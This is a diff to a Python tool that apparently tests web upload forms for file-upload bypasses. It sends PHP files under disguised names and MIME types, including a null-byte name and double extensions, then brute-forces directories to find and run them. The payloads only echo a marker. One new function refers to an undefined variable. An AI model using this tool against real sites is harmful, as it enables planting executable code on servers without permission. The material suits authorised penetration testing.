@@ -71,15 +71,14 @@ def find_file_urls(target_url, filename, returned_path=None, wordlist=None):
     common_dirs = ['upload', 'uploads', 'files', 'images', 'file', 'image', 'video', 'videos']
     for d in common_dirs:
         for fn in filename_variants(filename):
-            urls.add(base + d + '/' + fn)
+            urls.add(f"{base}{d}/{fn}")
 
     if args.dirb:
         with open(args.dirb, 'r', errors='ignore') as f:
-            for line in f:
-                d = line.strip().strip('/')
-                if d:
-                    for fn in filename_variants(filename):
-                        urls.add(base + d + '/' + fn)
+            for d in f:
+                d = d.strip().strip('/')
+                for fn in filename_variants(filename):
+                    urls.add(f"{base}{d}/{fn}")
     return list(urls)
 
 def extract_vars(html):
@@ -96,27 +95,30 @@ def upload_file(url, field_name, payload, cookies=None, headers=None):
         content = content.encode()
     if args.perso:
         print("Example to personnalize your file :\nFile name : image.php\nContent file : <?php echo 'test'?>\nMIME file : image/gif\n")
-        ask_name = str(input("File name :"))
-        ask_content = str(input("Content file :"))
-        ask_mime = str(input("MIME file :"))
-        files = {field_name: (ask_name, ask_content, ask_mime)}
+        name = str(input("File name :"))
+        content = str(input("Content file :"))
+        mime = str(input("MIME file :"))
+        files = {field_name: (name, content, mime)}
     else:
         files = {field_name: (payload["file_name"], content, payload["mime"])}
-    req = requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
+    r = requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
     if args.details:
-        print(req.text)
-    return req
-
+        print(r.text)
+    return r
+#==============================FUNCTION==============================
 def analyze_response(html):
     result = {"success": False, "error": None, "path": None}
-
     err = re.search(r"(wrong|error|invalid|denied|fail)[^<]*", html, re.I)
+    m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)",html,re.I)
+    paths = re.findall(r"""href=['"]([^'"]*{0}[^'"]*)['"]""".format(re.escape(hash)),html,re.I)
+
     if err:
         result["error"] = err.group(0).strip()
         return result
-
-    paths = re.findall(r"""href=[\'"]([^\'"]+/[^\'"]+)[\'"]""", html, re.I)
-
+    if m:
+        result["path"] = m.group(1)
+        result["success"] = True
+        return result
     if not paths:
         return result
     if len(paths) > 1:
@@ -129,7 +131,7 @@ def analyze_response(html):
         result["path"] = paths[0]
     result["success"] = True
     return result
-
+#==============================FUNCTION==============================
 def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):
     r = upload_file(url, field_name, payload, cookies, headers)
     u = analyze_response(r.text)
@@ -137,35 +139,47 @@ def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):
         print(r)
         print(f"analyze_response : {u}")
     return u
-
-def find_uploaded_file(target_url, payload, returned_path,
-                       cookies=None, headers=None, wordlist=None):
+#==============================FUNCTION==============================
+def find_uploaded_file(target_url, payload, returned_path,cookies=None, headers=None, wordlist=None):
     urls = find_file_urls(target_url, payload['file_name'], returned_path, wordlist)
     if args.details:
-        print(f'find_file_urls : {urls}')
+        for url in urls:
+            print(f'find_file_urls : {url}')
     for u in urls:
-        try:
-            r = requests.get(u, cookies=cookies, headers=headers, timeout=5)
-        except requests.RequestException:
-            continue
+        r = requests.get(u, cookies=cookies, headers=headers)
         if r.status_code == 200:
             print(f"[+] HIT -> {u}")
             return r.text, u
-        elif r.status_code == 403:
-            print(f"[!] Permission denied -> {u}")
+    url_hit = search_from_hash(get_base_dir(target_url))
+    if url_hit:
+        r = requests.get(url_hit, cookies=cookies, headers=headers)
+        if r.status_code == 200:
+            print(f"[+] HIT (gallery) -> {url_hit}")
+            return r.text, url_hit
     return None, None
-
+#==============================FUNCTION==============================
+def search_from_hash(base):
+    r = requests.get(base, cookies=cookies, headers=headers)
+    links = re.findall(r"""href=['"]([^'"]+)['"]""", html, re.I)
+    for l in links:
+        print(l)
+        page = requests.get(base + l.strip("'\""), cookies=cookies, headers=headers)
+        print(page.text)
+        if hash in page.text:
+            m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)", page.text)
+            if m:
+                return base.rstrip("/") + m.group(1)
+    return None
 #==========================VARIABLES==========================#
-succes = []
 hash = binascii.hexlify(os.urandom(16)).decode()
+succes = False
 #==========================PAYLOADS==========================#
 payloads = {
-    0: {"file_name": "sample.txt", "mime": "text/plain", "content": "Ray manta upload"},
-    1: {"file_name": "image.php%00.png", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
-    2: {"file_name": "image.php", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
-    3: {"file_name": "image.php", "mime": "image/png", "content": "<?php echo 'Ray manta upload'; ?>"},
-    4: {"file_name": "image.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
-    5: {"file_name": "image.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
+    0: {"file_name": f"{hash}.txt", "mime": "text/plain", "content": "Ray manta upload"},
+    1: {"file_name": f"{hash}.php%00.png", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
+    2: {"file_name": f"{hash}.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
+    3: {"file_name": f"{hash}.gif", "mime": "application/x-php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    4: {"file_name": f"{hash}.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
 }
 # \xff\xd8\xff\xe0
 #==========================COOKIES + HEADERS==========================#
@@ -179,7 +193,6 @@ if args.header:
     headers = dict(h.split(":", 1) for h in args.header.split(";"))
 #====================================OPTIONS====================================#
 print(f"{main_payload}\n")
-
 
 if args.perso and args.auto:
     print("[!] You can't send a personnalized file and send all payloads")
@@ -241,7 +254,7 @@ if args.url:
                 if content:
                     print(content)
         else:
-            print(f" File not found or file error : {content}")
+            print(f"\n[!] File not found or file error : \n{content}\n")
 
     print("\n[+] Terminé")
     print(exit_payload)
